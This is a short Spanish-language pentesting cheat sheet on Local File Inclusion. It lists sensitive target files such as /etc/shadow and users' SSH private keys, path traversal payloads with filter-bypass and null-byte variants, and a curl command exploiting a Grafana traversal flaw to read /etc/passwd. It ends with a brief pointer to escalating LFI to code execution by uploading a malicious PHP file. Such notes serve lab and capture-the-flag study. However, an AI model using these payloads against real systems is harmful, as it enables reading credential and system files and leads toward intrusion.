### Local File Inclusion
#### Ficheros interesantes en LFI
* /etc/passwd
* /etc/shadow
* /var/log/apache2/access.log
* /var/log/httpd/access.log
* /home/$USER/.ssh/id_rsa
* /var/log/mail.log
* var/log/maillog
* /var/mail/helios
* 

#### Path traversal basics
```bash
../../etc/passwd
....//....//etc/passwd
..////..////..../////etc/passwd
```

#### Path traversal PHP
Cuando un fichero php en una web, contiene algún include para un fichero, por ejemplo:
http://10.10.10.10/index.php?page= 

se puede intentar un path traversal justo ahí, detrás del igual.  El null byte final se utiliza para omitir la extensión, ya que en ocasiones se concatena la extensión en el codigo.

para que la web se vea así:
http://10.10.10.10/index.php?page=curso
en lugar de
http://10.10.10.10/index.php?page=curso.php

```bash
../../etc/passwd%00
```
#### LFI en Grafana
Con CURL. En alguna versión vulnerable de "Grafana", se puede ver ficheros de la máquina de la siguiente manera:
```bash
curl http://ip/../../../../../../../../etc/passwd --path-as-is -o fichero.extension
```

#### LFI to RCE
Si detectamos un LFI y por casualidad podemos subir ficheros, podriamos subir un fichero malicioso en php